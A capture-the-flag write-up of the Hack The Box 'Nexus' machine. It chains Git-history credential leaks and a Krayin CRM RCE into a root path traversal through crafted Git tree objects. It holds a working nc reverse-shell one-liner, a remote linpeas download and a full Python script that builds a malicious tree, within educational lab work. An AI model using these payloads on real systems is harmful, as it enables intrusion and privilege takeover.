# Nexus — Hack The Box Writeup

**Machine:** Nexus  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** October 2026  

---

## Summary

Nexus is an easy Linux machine built around a self-hosted Gitea instance and a Krayin CRM deployment. The attack chain starts with vhost enumeration uncovering `git.nexus.htb`, where a publicly readable repository leaks a Krayin CRM `.env` file and, in its commit history, a plaintext database password. Those credentials grant admin access to the CRM at `billing.nexus.htb`, which is running a version vulnerable to CVE-2026-38526, an authenticated RCE that yields a reverse shell as `www-data`. A second database password recovered from the live `.env` file on disk doubles as the SSH password for the user `jones`. Privilege escalation abuses a root-run `gitea-template-sync.timer` whose underlying script extracts files from any Gitea repository marked as a "template" using unsanitised paths from `git ls-tree` — a path traversal in the sync script allows writing an SSH public key to `/root/.ssh/authorized_keys` by crafting a malicious Git tree object directly, bypassing the working-tree checks a normal `git add` would apply.

**Key techniques:** Vhost enumeration · Gitea public repository disclosure · Credential exposure via git commit history · Credential reuse (`.env` → CRM admin) · CVE-2026-38526 (Krayin CRM authenticated RCE) · Reverse shell · Live `.env` credential harvesting · Credential reuse (DB → SSH) · Systemd timer enumeration · Path traversal via crafted Git tree objects · Root SSH key injection

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.126.174 -v
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Two services: SSH and a web server. The HTTP response does not follow its redirect to `http://nexus.htb/`, so the hostname is added to `/etc/hosts`:

```bash
sudo vi /etc/hosts
# Add: 10.129.126.174  nexus.htb
```

---

## Enumeration

### Web Application — nexus.htb

Navigating to `http://nexus.htb` reveals a government-styled "Nexus Energy Authority" site. An OSINT/staff page lists three names, and a careers section includes a job posting with a hiring-manager contact email (`j.matthew@nexus.htb`) — useful later as a likely CRM/admin username.

Directory enumeration on the base domain returns nothing of note:

```bash
gobuster dir -u http://10.129.126.174 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b 302
```

### Vhost Enumeration

Directory enumeration alone found nothing interesting, so vhost enumeration is run next — and this is where the real attack surface is:

```bash
gobuster vhost -u http://nexus.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

```
git.nexus.htb      Status: 200 [Size: 14474]
billing.nexus.htb  Status: 302 [Size: 390] [--> http://billing.nexus.htb/admin/login]
```

Two new vhosts. Add both to `/etc/hosts`.

### git.nexus.htb — Gitea

The response is a Gitea instance (version 1.26.0, confirmed in the footer). Sign-in is not required to browse — clicking **Explore** at `/explore/repos` lists public repositories:

```
admin / krayin-docker-setup
```

### Exposed `.env` in a Public Repository

The repository contains `.env`, `docker-compose.yml`, and a `documents` directory. Reading `.env` directly:

```
APP_URL=http://billing.nexus.htb
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=
IMAP_USERNAME=username1
IMAP_PASSWORD=password1
```

The live `DB_PASSWORD` field is empty in the current version of the file — but Gitea repositories carry full commit history, and this one has two commits. Checking the diff:

```diff
- DB_PASSWORD=N27xh!!2ucY04
+ DB_PASSWORD=
```

The password was present in an earlier commit and scrubbed in a later one — but the history remains fully readable. **Credential recovered:** `N27xh!!2ucY04`.

---

## Initial Access

### Credential Reuse — Krayin CRM Admin

`billing.nexus.htb` redirects to `/admin/login` — a Krayin CRM instance. Using the earlier-found hiring-manager email as the username, paired with the password recovered from Git history:

```
Username: j.matthew@nexus.htb
Password: N27xh!!2ucY04
```

Login succeeds. The admin panel confirms the account belongs to **James Matthew** and the CRM is running **version 2.2.0**.

### CVE-2026-38526 — Krayin CRM Authenticated RCE

Searching for public exploits against Krayin 2.2.0 surfaces a PoC:

```
https://github.com/NathanHimself/CVE-2026-38526-PoC
```

Verifying command execution:

```bash
python3 exploit.py -t http://billing.nexus.htb \
  -u "j.matthew@nexus.htb" -p 'N27xh!!2ucY04' -c "whoami"
# www-data
```

> **Note:** The password contains `!!`, which bash history-expands unless the value is wrapped in single quotes. Using double quotes or leaving it unquoted mangles the payload.

### Reverse Shell

Set up a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell via the same RCE:

```bash
python3 exploit.py -t http://billing.nexus.htb \
  -u "j.matthew@nexus.htb" -p 'N27xh!!2ucY04' \
  -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.66 4444 >/tmp/f"
```

```
connect to [10.10.14.66] from (UNKNOWN) [10.129.127.69] 49042
$
```

Stabilise the shell:

```bash
script /dev/null -c /bin/bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Shell obtained as `www-data`.

---

## Lateral Movement — www-data → jones

### Live `.env` Credential Harvesting

The deployed application at `/var/www/krayin` has a **current** `.env` file distinct from the one leaked via Git — this one holds a different, live database password:

```bash
cat .env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

Querying the live database with these credentials turns up nothing of further use (the `users` table holds only the already-known `james`/`j.matthew` account; all other relevant tables are empty). The credential itself, however, is worth testing elsewhere.

### Credential Reuse — SSH as jones

`/home` lists two users: `git` and `jones`. Testing the database password directly against SSH for `jones`:

```bash
ssh jones@10.129.127.69
# Password: y27xb3ha!!74GbR
```

Login succeeds — the database password doubled as `jones`'s system password.

```bash
cat user.txt
# f593d62c1302848d06d059a82a1c8077
```

```bash
sudo -l
# Sorry, user jones may not run sudo on nexus.
```

No sudo rights. Moving to automated enumeration.

---

## Privilege Escalation — Gitea Template Sync Path Traversal

### LinPEAS — System Timers

```bash
wget http://10.10.14.66:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Among the active systemd timers:

```
gitea-template-sync.timer  →  gitea-template-sync.service
```

A custom, non-default timer tied to Gitea is immediately worth reading.

### Reading the Sync Script

```bash
cat /etc/gitea/template-sync.py
```

The script runs periodically (as root, via the timer) and does the following:

1. Authenticates to the local Gitea API with a token read from config
2. Queries `/api/v1/repos/search` for every repository flagged as a **template**
3. For each template repo, runs `git ls-tree -r HEAD` against the bare repository to list every file path and blob hash
4. Extracts each blob with `git cat-file blob <hash>` and writes it to `STAGING_DIR/<owner>/<repo>/<filepath>` using `os.path.join()` — **with no sanitisation of the path returned by `git ls-tree`**

### Understanding the Vulnerability

`os.path.join()` in Python discards all preceding path components the moment it encounters an absolute path, and happily resolves `..` traversal sequences when later joined and written to. Because the script trusts whatever path string comes back from `git ls-tree` verbatim, a file path inside the repository's Git **tree object** — not its working tree — containing `../../../../../root/.ssh/authorized_keys` will be extracted straight to that absolute location when the script runs as root.

Critically, this path never has to pass through an actual `git add` or checkout on a real filesystem (which would normally reject `..` in a path) — it only has to exist as a valid entry inside a Git **tree object**, which can be constructed by hand with the low-level plumbing commands (`hash-object`, tree entries, commit objects) without ever writing the illegal path to disk locally.

### Setting Up — Gitea Access as jones

The recovered database password also works for Gitea itself:

```
jones : y27xb3ha!!74GbR
```

Logging in to `git.nexus.htb` as `jones`, a new repository is created (`rootprivesc`) and marked as a **template** — the exact flag the sync script filters on.

### Crafting the Malicious Tree

Generate an SSH keypair to inject:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Clone the empty template repo locally:

```bash
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rootprivesc.git
cd rootprivesc
```

Rather than relying on a normal working-tree commit (which Git itself would refuse for a `..`-containing path), the commit is built directly from raw Git objects using Python, writing loose objects into `.git/objects` by hand:

```python
# build.py
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo"); sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
key = r.stdout.strip() + "\n"

blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")
for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")
root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")

ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

This hand-builds a Git **tree** whose root entry is a file (`README.md` — needed so the repo isn't considered empty) alongside a `..` subtree, nested five levels deep, terminating in `root/.ssh/authorized_keys`. Running it and pushing:

```bash
python3 build.py
# Done: 8876c280873f44aea022fd28a597c563f9b0505a

git push -u origin main --force
```

Git's client-side safety checks apply to working-tree operations like `git add`, not to raw objects pushed directly to a remote — so the malicious tree uploads successfully despite containing `..` path components.

### Triggering the Sync and Waiting

`gitea-template-sync.timer` fires on its own schedule (observed roughly every minute in this environment). Once it runs, `template-sync.py` queries Gitea for template repos, finds `jones/rootprivesc`, runs `git ls-tree` against it, and — trusting the `..`-laden paths verbatim — writes the attacker's public key to `/root/.ssh/authorized_keys` as root.

### Root Shell

```bash
ssh -i /tmp/.k root@nexus.htb
```

```bash
root@nexus:~# whoami
root
root@nexus:~# cat root.txt
# d4ff19bacb1700105150590304f49c02
```

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| No vhosts advertised from base domain | `nexus.htb` → `git.nexus.htb` / `billing.nexus.htb` | Entire attack surface hidden behind unlisted subdomains |
| Publicly readable Gitea repository | `git.nexus.htb/admin/krayin-docker-setup` | Live `.env` and commit history exposed to any visitor |
| Secret present in commit history after being scrubbed | `.env` → `DB_PASSWORD` | "Removed" credential still fully recoverable via git log |
| Credential reuse | Git-leaked password → CRM admin login | Full admin access to Krayin CRM as `j.matthew` |
| CVE-2026-38526 — Krayin CRM authenticated RCE | Krayin CRM 2.2.0 | RCE as `www-data` |
| Live `.env` readable post-shell | `/var/www/krayin/.env` | Second, different database password recovered |
| Credential reuse | Live DB password → SSH / Gitea | Lateral access as `jones` on both the OS and Gitea |
| Path traversal in root-run sync script | `/etc/gitea/template-sync.py` (`gitea-template-sync.timer`) | Arbitrary file write as root via crafted Git tree object |
| Git plumbing bypasses working-tree path validation | Hand-built tree/commit objects pushed directly | `..` traversal survives into a path the script writes verbatim |

---

## Key Takeaways

- **Vhost enumeration is not optional** — the entire attack surface (Gitea and the CRM) lived on unlisted subdomains. Directory enumeration on the base domain found nothing because there was nothing to find there
- **"Public" Git repositories leak more than their current state** — the live `.env` had an empty password field, but the commit history still held the real one in plaintext. A removed secret is not a secured secret; history must be scrubbed or the credential must be rotated
- **Multiple `.env` files are common in CMS/CRM deployments** — the repo's `.env` and the live, deployed `.env` held *different* passwords. Both are worth checking; assume neither reflects runtime state until verified
- **Credential reuse chains are the norm across this machine** — a Git-leaked password unlocked the CRM, and a live-config password separately unlocked both SSH and Gitea for a second user. Every recovered credential should be tried everywhere
- **Automated/scheduled scripts running as root are a prime target** — `gitea-template-sync.timer` was easy to miss without systematic timer enumeration (`linpeas`/`systemctl list-timers`), but it was the entire privilege escalation path once found
- **Validate paths from untrusted data, not just untrusted input fields** — `template-sync.py` sanitised nothing coming out of `git ls-tree`, trusting that repository content itself was safe. Any value with attacker-controlled provenance (including file paths inside version control) needs the same scrutiny as a web parameter
- **Git's local safety nets don't protect the plumbing layer** — porcelain commands like `git add` refuse to stage files with `..` in the path, but hand-constructed tree objects pushed straight to a remote bypass that check entirely. Any tool that blindly trusts `git ls-tree` output is exposed to this regardless of what the working-tree rules normally prevent

---

*Part of my HTB writeup series — [back to portfolio](https://github.com/Egio7)*
